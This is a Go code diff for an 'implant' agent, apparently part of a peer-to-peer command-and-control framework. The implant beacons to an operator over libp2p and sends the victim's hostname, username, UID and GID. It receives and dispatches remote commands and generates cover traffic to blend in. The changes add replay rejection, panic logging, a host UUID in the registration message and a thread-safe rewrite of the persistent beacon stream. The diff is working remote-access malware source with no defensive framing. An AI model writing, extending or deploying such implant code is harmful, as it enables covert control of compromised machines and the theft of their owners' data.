@@ -13,6 +13,7 @@ import (
 	"os/user"
 	"path/filepath"
 	"runtime"
+	"runtime/debug"
 	"sync"
 	"time"
 
@@ -214,7 +215,7 @@ func (a *Agent) discoverOperatorLoop(ns string) {
 	for {
 		if a.node.DHT != nil {
 			rt := a.node.DHT.RoutingTable()
-			if rt != nil && rt.Size() > 0 {
+			if rt != nil && rt.Size() >= 5 {
 				break
 			}
 		}
@@ -295,7 +296,9 @@ func (a *Agent) beaconLoop() {
 	for {
 		func() {
 			defer func() {
-				recover()
+				if r := recover(); r != nil {
+					log.Printf("[implant] panic in beaconLoop: %v\n%s", r, debug.Stack())
+				}
 			}()
 			a.sendBeaconRegister()
 		}()
@@ -322,7 +325,9 @@ func (a *Agent) streamKeepaliveLoop() {
 
 		func() {
 			defer func() {
-				recover()
+				if r := recover(); r != nil {
+					log.Printf("[implant] panic in streamKeepaliveLoop: %v\n%s", r, debug.Stack())
+				}
 			}()
 
 			a.connectedMu.Lock()
@@ -356,7 +361,9 @@ func (a *Agent) coverTrafficLoop() {
 
 		func() {
 			defer func() {
-				recover()
+				if r := recover(); r != nil {
+					log.Printf("[implant] panic in coverTrafficLoop: %v\n%s", r, debug.Stack())
+				}
 			}()
 			a.sendCoverTraffic()
 		}()
@@ -390,6 +397,7 @@ func (a *Agent) sendBeaconRegister() {
 	reg := &apb.Register{
 		Name:     username,
 		Hostname: hostname,
+		UUID:     a.node.ID().String(),
 		Username: username,
 		UID:      uid,
 		GID:      gid,
@@ -434,8 +442,6 @@ func (a *Agent) sendBeaconRegister() {
 	}
 }
 
-
-
 func (a *Agent) sendBeaconDirect(operatorID peer.ID) {
 	defer func() {
 		if r := recover(); r != nil {
@@ -462,6 +468,7 @@ func (a *Agent) sendBeaconDirect(operatorID peer.ID) {
 	reg := &apb.Register{
 		Name:     username,
 		Hostname: hostname,
+		UUID:     a.node.ID().String(),
 		Username: username,
 		UID:      uid,
 		GID:      gid,
@@ -502,6 +509,11 @@ func (a *Agent) handleCommand(ctx context.Context, env *apb.Envelope, senderPub 
 		return
 	}
 
+	if a.messenger.IsReplay(env.ID) {
+		log.Printf("[implant] dropped replay — type=%d id=%d", env.Type, env.ID)
+		return
+	}
+
 	log.Printf("[implant] received command type=%d", env.Type)
 
 	switch env.Type {
@@ -532,7 +544,9 @@ func (a *Agent) handleCommand(ctx context.Context, env *apb.Envelope, senderPub 
 
 func (a *Agent) handleCommandStream(s network.Stream) {
 	defer func() {
-		recover()
+		if r := recover(); r != nil {
+			log.Printf("[implant] panic in handleCommandStream: %v\n%s", r, debug.Stack())
+		}
 	}()
 	defer s.Close()
 
@@ -589,44 +603,71 @@ func (a *Agent) sendEnvelopeDirect(operatorID peer.ID, env *apb.Envelope) error 
 		env.SenderKey = pubBytes
 	}
 
-	a.beaconMu.Lock()
-	defer a.beaconMu.Unlock()
-
-	if a.beaconStream == nil {
-		cs := a.node.Host.Network().Connectedness(operatorID)
-		if cs != network.Connected && cs != network.Limited {
-			connCtx, cancel := context.WithTimeout(a.ctx, 5*time.Second)
-			err := a.node.ConnectToPeer(connCtx, peer.AddrInfo{ID: operatorID})
-			cancel()
-			if err != nil {
-				return fmt.Errorf("connect: %w", err)
-			}
-		}
-		a.beaconStream, err = a.openBeaconStream(operatorID)
-		if err != nil {
-			return fmt.Errorf("open persistent stream: %w", err)
-		}
-		log.Printf("[implant] persistent beacon stream opened")
+	s := a.getBeaconStream(operatorID)
+	if s == nil {
+		return fmt.Errorf("nil beacon stream")
 	}
 
 	envData, err := proto.Marshal(env)
 	if err != nil {
 		return fmt.Errorf("marshal: %w", err)
 	}
-	a.beaconStream.SetWriteDeadline(time.Now().Add(5 * time.Second))
-	if err := binary.Write(a.beaconStream, binary.LittleEndian, uint32(len(envData))); err != nil {
-		a.beaconStream.Close()
-		a.beaconStream = nil
+	s.SetWriteDeadline(time.Now().Add(5 * time.Second))
+	if err := binary.Write(s, binary.LittleEndian, uint32(len(envData))); err != nil {
+		s.Close()
+		a.setBeaconStream(nil)
 		return fmt.Errorf("write len: %w", err)
 	}
-	if _, err := a.beaconStream.Write(envData); err != nil {
-		a.beaconStream.Close()
-		a.beaconStream = nil
+	if _, err := s.Write(envData); err != nil {
+		s.Close()
+		a.setBeaconStream(nil)
 		return fmt.Errorf("write data: %w", err)
 	}
-	var zero time.Time
-	a.beaconStream.SetWriteDeadline(zero)
+	s.SetWriteDeadline(time.Time{})
 	return nil
+}
+
+func (a *Agent) getBeaconStream(operatorID peer.ID) network.Stream {
+	a.beaconMu.Lock()
+	s := a.beaconStream
+	if s != nil {
+		a.beaconMu.Unlock()
+		return s
+	}
+	a.beaconMu.Unlock()
+
+	cs := a.node.Host.Network().Connectedness(operatorID)
+	if cs != network.Connected && cs != network.Limited {
+		connCtx, cancel := context.WithTimeout(a.ctx, 5*time.Second)
+		err := a.node.ConnectToPeer(connCtx, peer.AddrInfo{ID: operatorID})
+		cancel()
+		if err != nil {
+			return nil
+		}
+	}
+
+	s, err := a.openBeaconStream(operatorID)
+	if err != nil {
+		return nil
+	}
+
+	a.beaconMu.Lock()
+	if a.beaconStream == nil {
+		a.beaconStream = s
+	} else {
+		s.Close()
+		s = a.beaconStream
+	}
+	a.beaconMu.Unlock()
+
+	log.Printf("[implant] persistent beacon stream opened")
+	return s
+}
+
+func (a *Agent) setBeaconStream(s network.Stream) {
+	a.beaconMu.Lock()
+	a.beaconStream = s
+	a.beaconMu.Unlock()
 }
 
 func (a *Agent) sendError(msgType uint32, errMsg string) {
